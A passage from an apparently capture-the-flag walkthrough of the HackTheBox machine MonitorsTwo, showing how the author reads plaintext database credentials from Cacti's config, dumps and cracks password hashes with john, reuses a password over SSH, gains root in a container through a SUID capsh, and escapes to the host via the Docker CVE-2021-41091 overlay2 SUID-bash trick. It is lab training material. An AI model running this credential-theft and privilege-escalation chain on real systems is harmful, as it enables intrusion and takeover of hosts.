drwxr-xr-x   2 root root  4096 Mar 22 13:21 mnt
drwxr-xr-x   2 root root  4096 Mar 22 13:21 opt
dr-xr-xr-x 274 root root     0 May  2 13:53 proc
drwx------   1 root root  4096 Mar 21 10:50 root
drwxr-xr-x   1 root root  4096 Nov 15 04:17 run
drwxr-xr-x   1 root root  4096 Jan  9 09:30 sbin
drwxr-xr-x   2 root root  4096 Mar 22 13:21 srv
dr-xr-xr-x  13 root root     0 May  2 13:53 sys
drwxrwxrwt   1 root root 24576 May  2 14:59 tmp
drwxr-xr-x   1 root root  4096 Nov 14 00:00 usr
drwxr-xr-x   1 root root  4096 Nov 15 04:13 var
</code></pre></div><p>One interesting service to analyze is the database. We can search for configuration files for the web server to see if we find plaintext credentials:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@50bca5e748b0:/var/www/html$ find . | grep config
./include/config.php
./docs/images/graphs-edit-nontemplate-configuration.png
./docs/apache_template_config.html
www-data@50bca5e748b0:/var/www/html$ cat include/config.php
&lt;?php
/*
 * ...
 */

/*
 * Make sure these values reflect your actual database/host/user/password  
 */

$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;

/*
 * ...
 */
</code></pre></div><p>There we have them, now we can connect and try to find passwords for the web application:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root --database=cacti  
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

<span class="code-white">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span>
<span class="code-white">Your MySQL connection id is 325</span>
<span class="code-white">Server version: 5.7.40 MySQL Community Server (GPL)</span>

<span class="code-white">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span>

<span class="code-white">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span>

MySQL [cacti]&gt; show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| ...                                 |
| snmpagent_notifications_log         |
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| ...                                 |
| version                             |
+-------------------------------------+
<span class="code-white">111 rows in set (0.001 sec)</span>

MySQL [cacti]&gt; describe user_auth;
+------------------------+-----------------------+------+-----+---------+----------------+
| Field                  | Type                  | Null | Key | Default | Extra          |
+------------------------+-----------------------+------+-----+---------+----------------+
| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
| username               | varchar(50)           | NO   | MUL | 0       |                |
| password               | varchar(256)          | NO   |     |         |                |
| realm                  | mediumint(8)          | NO   | MUL | 0       |                |
| full_name              | varchar(100)          | YES  |     | 0       |                |
| ...                    | ...                   | ...  | ... | ...     | ...           |
+------------------------+-----------------------+------+-----+---------+----------------+
<span class="code-white">25 rows in set (0.001 sec)</span>

MySQL [cacti]&gt; select username, password from user_auth;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+
<span class="code-white">3 rows in set (0.000 sec)</span>
</code></pre></div><p>Another way to find this is reading <code>/entrypoint.sh</code>, which is a script that executes when the Docker container is booting:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@50bca5e748b0:/var/www/html$ cat /entrypoint.sh  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
<span class="mtk7">set</span><span class="mtk1"> </span><span class="mtk6">-ex</span>

<span class="mtk7">wait</span><span class="mtk1">-for-it </span><span class="mtk4">db:</span><span class="mtk6">3306</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk6">300</span><span class="mtk1"> </span><span class="mtk6">--</span><span class="mtk1"> </span><span class="mtk4">echo</span><span class="mtk1"> </span><span class="mtk4">"database is connected"</span>
<span class="mtk5">if</span><span class="mtk1"> [[ </span><span class="mtk5">!</span><span class="mtk1"> </span><span class="mtk4">$(mysql </span><span class="mtk6">--host=db</span><span class="mtk4"> </span><span class="mtk6">--user=root</span><span class="mtk4"> </span><span class="mtk6">--password=root</span><span class="mtk4"> cacti </span><span class="mtk6">-e</span><span class="mtk4"> "show tables")</span><span class="mtk1"> </span><span class="mtk5">=~</span><span class="mtk1"> </span><span class="mtk4">"automation_devices"</span><span class="mtk1"> ]]; </span><span class="mtk5">then</span>
<span class="mtk1">    mysql </span><span class="mtk6">--host=db</span><span class="mtk1"> </span><span class="mtk6">--user=root</span><span class="mtk1"> </span><span class="mtk6">--password=root</span><span class="mtk1"> </span><span class="mtk4">cacti</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk4">/var/www/html/cacti.sql</span>
<span class="mtk1">    mysql </span><span class="mtk6">--host=db</span><span class="mtk1"> </span><span class="mtk6">--user=root</span><span class="mtk1"> </span><span class="mtk6">--password=root</span><span class="mtk1"> </span><span class="mtk4">cacti</span><span class="mtk1"> </span><span class="mtk6">-e</span><span class="mtk1"> </span><span class="mtk4">"UPDATE user_auth SET must_change_password='' WHER</span><span class="mtk4">E username = 'admin'"</span>  
<span class="mtk1">    mysql </span><span class="mtk6">--host=db</span><span class="mtk1"> </span><span class="mtk6">--user=root</span><span class="mtk1"> </span><span class="mtk6">--password=root</span><span class="mtk1"> </span><span class="mtk4">cacti</span><span class="mtk1"> </span><span class="mtk6">-e</span><span class="mtk1"> </span><span class="mtk4">"SET GLOBAL time_zone = 'UTC'"</span>
<span class="mtk5">fi</span>

<span class="mtk1">chown </span><span class="mtk4">www-data:www-data</span><span class="mtk1"> </span><span class="mtk6">-R</span><span class="mtk1"> </span><span class="mtk4">/var/www/html</span>
<span class="mtk3"># first arg is `-f` or `--some-option`</span>
<span class="mtk5">if</span><span class="mtk1"> [ </span><span class="mtk4">"</span><span class="mtk9 mtki">${1</span><span class="mtk5">#</span><span class="mtk1">-</span><span class="mtk9 mtki">}</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk9 mtki">$1</span><span class="mtk4">"</span><span class="mtk1"> ]; </span><span class="mtk5">then</span>
<span class="mtk1">        </span><span class="mtk7">set</span><span class="mtk1"> </span><span class="mtk6">--</span><span class="mtk1"> </span><span class="mtk4">apache2-foreground</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk9 mtki">$@</span><span class="mtk4">"</span>
<span class="mtk5">fi</span>

<span class="mtk7">exec</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk9 mtki">$@</span><span class="mtk4">"</span>
</code></pre></div><p>Now we have some hashes, we can try to crack them with <code>john</code> and <code>rockyou.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt <span class="mtku">hashes</span>
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])  
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (marcus)
</code></pre></div><h3 id="testing">Testing</h3><p>And we got a plaintext password for user <code>marcus</code>. Since the hashes come from <code>bcrypt</code>, the cracking process is very time-consuming. While waiting, I modified the passwords for all users and logged into Cacti to see if there was something interesting:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; import bcrypt
&gt;&gt;&gt; bcrypt.hashpw(b'asdf', bcrypt.gensalt())
b'$2b$12$vHXG7DCXqUAUGPSEUz1eNuLXAh8Evs0h5XMb6fOZFPz8Vj61S4qru'  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">MySQL [cacti]&gt; update user_auth set password = '$2b$12$vHXG7DCXqUAUGPSEUz1eNuLXAh8Evs0h5XMb6fOZFPz8Vj61S4qru' where 1;  
<span class="code-white">Query OK, 3 rows affected (0.006 sec)</span>
<span class="code-white">Rows matched: 3  Changed: 3  Warnings: 0</span>
</code></pre></div><p><img src="/images/HTB/MonitorsTwo/MonitorsTwo-2.webp" alt="MonitorsTwo 2"></p><p>But it was not&mldr;</p><h2 id="system-enumeration">System enumeration</h2><p>Luckily, <code>john</code> found a password for <code>marcus</code> (<code>funkymonkey</code>), which is reused in SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> marcus@10.10.11.211
marcus@10.10.11.211's password:
<span class="code-green">marcus@monitorstwo</span>:<span class="code-blue">~</span>$ cat user.txt  
3f29c3098977d9a17a060b91d9004848
</code></pre></div><p>When logging in, we see a notification that shows <code>You have mail</code>. Indeed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">marcus@monitorstwo</span>:<span class="code-blue">~</span>$ cat /var/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.  

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
</code></pre></div><p>We are given some information about useful CVE to exploit this machine. The third one seems promising because we have some control over a Docker container and the version is outdated:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">marcus@monitorstwo</span>:<span class="code-blue">/tmp</span>$ docker version
Client:
 Version:           20.10.5+dfsg1
 API version:       1.41
 Go version:        go1.15.9
 Git commit:        55c4c88
 Built:             Wed Aug  4 19:55:57 2021
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version": dial unix /var/run/docker.sock: connect: permission denied  
</code></pre></div><p>In fact, there is a <a href="https://github.com/UncleJ4ck/CVE-2021-41091">proof of concept</a> that was tested specifically on <code>20.10.5+dfag1</code>, so we must be on the right track.</p><h2 id="privilege-escalation">Privilege escalation</h2><p>First of all, we need to find a way to escalate privileges on the container&mldr;</p><h3 id="container">Container</h3><p>If we list SUID binaries, we find <code>capsh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@50bca5e748b0:/var/www/html$ find / -perm -4000 2>/dev/null  
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
</code></pre></div><p>This binary appears in <a href="https://gtfobins.github.io/gtfobins/capsh/">GFTObins</a>, and it looks that we can get a shell as <code>root</code> when this binary is SUID. You can use my tool <a href="https://github.com/7Rocky/gtfobins-cli"><code>gtfobins-cli</code></a> to view this information from the command line interface:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gtfobins-cli</span> --suid capsh

<span class="code-bg-green code-black">capsh</span> ==&gt; <span class="code-yellow">https://gtfobins.github.io/gtfobins/capsh/</span>


<span class="code-red mtku">SUID</span>

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run <span class="code-cyan">sh -p</span>, omit the <span class="code-cyan">-p</span> argument on systems like Debian (&lt;= Stretch) that allow the default <span class="code-cyan">sh</span> shell to run with SUID privileges.  

<span class="code-cyan">sudo install -m =xs $(which capsh) .</span>

<span class="code-cyan">./capsh --gid=0 --uid=0 --</span>
</code></pre></div><p>Easy, right?</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --  
root@50bca5e748b0:/var/www/html#
</code></pre></div><p>Perfect. Now, looking at the <a href="https://github.com/UncleJ4ck/CVE-2021-41091">proof of concept</a>, we see that basically, the program looks for a directory at <code>/var/lib/docker/overlay2</code> that is mapped to the Docker container. Therefore, if we modify <code>/bin/bash</code> to be a SUID binary, we can run this from the host machine as if it were a regular file of the host filesystem (kind of a directory traversal exploit). So, let&rsquo;s add this permission:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@50bca5e748b0:/var/www/html$ chmod 4755 /bin/bash  
root@50bca5e748b0:/var/www/html#
</code></pre></div><h3 id="docker-exploit">Docker exploit</h3><p>To find the directories, the exploit uses <code>findmnt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">marcus@monitorstwo</span>:<span class="code-blue">/tmp</span>$ findmnt
TARGET                                SOURCE      FSTYPE      OPTIONS
/                                     /dev/sda2   ext4        rw,relatime
├─/sys                                sysfs       sysfs       rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/security              securityfs  securityfs  rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/cgroup                    tmpfs       tmpfs       ro,nosuid,nodev,noexec,mode=755
│ │ ├─/sys/fs/cgroup/unified          cgroup2     cgroup2     rw,nosuid,nodev,noexec,relatime,nsdelegate
│ │ ├─/sys/fs/cgroup/systemd          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,xattr,name=systemd
│ │ ├─/sys/fs/cgroup/pids             cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,pids
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,cpu,cpuacct
│ │ ├─/sys/fs/cgroup/freezer          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,freezer
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,net_cls,net_prio
│ │ ├─/sys/fs/cgroup/cpuset           cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,cpuset
│ │ ├─/sys/fs/cgroup/perf_event       cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,perf_event
│ │ ├─/sys/fs/cgroup/hugetlb          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,hugetlb
│ │ ├─/sys/fs/cgroup/rdma             cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,rdma
│ │ ├─/sys/fs/cgroup/memory           cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,memory
│ │ ├─/sys/fs/cgroup/devices          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,devices
│ │ └─/sys/fs/cgroup/blkio            cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,blkio
│ ├─/sys/fs/pstore                    pstore      pstore      rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/bpf                       none        bpf         rw,nosuid,nodev,noexec,relatime,mode=700
│ ├─/sys/kernel/debug                 debugfs     debugfs     rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/tracing               tracefs     tracefs     rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/config                configfs    configfs    rw,nosuid,nodev,noexec,relatime
│ └─/sys/fs/fuse/connections          fusectl     fusectl     rw,nosuid,nodev,noexec,relatime
├─/proc                               proc        proc        rw,nosuid,nodev,noexec,relatime
│ └─/proc/sys/fs/binfmt_misc          systemd-1   autofs      rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=16682
│   └─/proc/sys/fs/binfmt_misc        binfmt_misc binfmt_misc rw,nosuid,nodev,noexec,relatime
├─/dev                                udev        devtmpfs    rw,nosuid,noexec,relatime,size=1966932k,nr_inodes=491733,mode=755
│ ├─/dev/pts                          devpts      devpts      rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000
│ ├─/dev/shm                          tmpfs       tmpfs       rw,nosuid,nodev
│ ├─/dev/mqueue                       mqueue      mqueue      rw,nosuid,nodev,noexec,relatime
│ └─/dev/hugepages                    hugetlbfs   hugetlbfs   rw,relatime,pagesize=2M
├─/run                                tmpfs       tmpfs       rw,nosuid,nodev,noexec,relatime,size=402612k,mode=755
│ ├─/run/lock                         tmpfs       tmpfs       rw,nosuid,nodev,noexec,relatime,size=5120k
│ ├─/run/docker/netns/f7f9c2eb75fc    nsfs[net:[4026532598]]
│ │                                               nsfs        rw
│ ├─/run/user/1000                    tmpfs       tmpfs       rw,nosuid,nodev,relatime,size=402608k,mode=700,uid=1000,gid=1000
│ └─/run/docker/netns/2cc283d5ea48    nsfs[net:[4026532659]]
│                                                 nsfs        rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overl  
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overl
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k
<span class="code-green">marcus@monitorstwo</span>:<span class="code-blue">/tmp</span>$ findmnt | grep -oE '/var/lib/docker/overlay2\/[0-9a-f]+?\/merged'
<span class="code-red">/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged</span>
<span class="code-red">/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged</span>
</code></pre></div><p>There are two possible directories. Let&rsquo;s see if some of them has <code>/bin/bash</code> with SUID permissions:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">marcus@monitorstwo</span>:<span class="code-blue">/tmp</span>$ ls -la /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
total 76
drwxr-xr-x 1 root root 4096 Jan  5 11:37 <span class="code-blue">.</span>
drwx-----x 5 root root 4096 May  2 13:53 <span class="code-blue">..</span>
lrwxrwxrwx 1 root root    7 Dec  6 03:07 <span class="code-cyan">bin</span> -&gt; <span class="code-blue">usr/bin</span>
dr-xr-xr-x 2 root root 4096 Mar 22 13:21 <span class="code-blue">boot</span>
drwxr-xr-x 1 root root 4096 Jan  5 11:37 <span class="code-blue">dev</span>
drwxr-xr-x 2 root root 4096 Dec  7 02:24 <span class="code-blue">docker-entrypoint-initdb.d</span>
-rwxr-xr-x 1 root root    0 Jan  5 11:37 <span class="code-green">.dockerenv</span>
lrwxrwxrwx 1 root root   34 Dec  7 02:24 <span class="code-cyan">entrypoint.sh</span> -&gt; <span class="code-green">usr/local/bin/docker-entrypoint.sh</span>
drwxr-xr-x 1 root root 4096 Jan  5 11:37 <span class="code-blue">etc</span>
drwxr-xr-x 2 root root 4096 Mar 22 13:21 <span class="code-blue">home</span>
lrwxrwxrwx 1 root root    7 Dec  6 03:07 <span class="code-cyan">lib</span> -&gt; <span class="code-blue">usr/lib</span>
lrwxrwxrwx 1 root root    9 Dec  6 03:07 <span class="code-cyan">lib64</span> -&gt; <span class="code-blue">usr/lib64</span>
drwxr-xr-x 2 root root 4096 Mar 22 13:21 <span class="code-blue">media</span>
drwxr-xr-x 2 root root 4096 Mar 22 13:21 <span class="code-blue">mnt</span>
drwxr-xr-x 2 root root 4096 Mar 22 13:21 <span class="code-blue">opt</span>
dr-xr-xr-x 2 root root 4096 Mar 22 13:21 <span class="code-blue">proc</span>
dr-xr-x--- 1 root root 4096 Dec  7 02:24 <span class="code-blue">root</span>
drwxr-xr-x 1 root root 4096 Dec  7 02:24 <span class="code-blue">run</span>
lrwxrwxrwx 1 root root    8 Dec  6 03:07 <span class="code-cyan">sbin</span> -&gt; <span class="code-blue">usr/sbin</span>
drwxr-xr-x 2 root root 4096 Mar 22 13:21 <span class="code-blue">srv</span>
dr-xr-xr-x 2 root root 4096 Mar 22 13:21 <span class="code-blue">sys</span>
drwxrwxrwt 1 root root 4096 May  2 13:53 <span class="code-blue code-bg-green">tmp</span>
drwxr-xr-x 1 root root 4096 Dec  6 03:07 <span class="code-blue">usr</span>
drwxr-xr-x 1 root root 4096 Dec  6 03:07 <span class="code-blue">var</span>
<span class="code-green">marcus@monitorstwo</span>:<span class="code-blue">/tmp</span>$ ls -la /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/bin/bash
-rwxr-xr-x 1 root root 964536 Nov 23  2021 <span class="code-green">/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/bin/bash</span>
<span class="code-green">marcus@monitorstwo</span>:<span class="code-blue">/tmp</span>$ ls -la /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 <span class="code-white code-bg-red">/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash</span>  
</code></pre></div><p>Great, there it is. Let&rsquo;s become <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">marcus@monitorstwo</span>:<span class="code-blue">/tmp</span>$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p  
bash-5.1# cat /root/root.txt
b387bb42bebe034bb10fb213d1c0e967
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a></li><li><a href="#container-enumeration">Container enumeration</a><ul><li><a href="#testing">Testing</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#container">Container</a></li><li><a href="#docker-exploit">Docker exploit</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 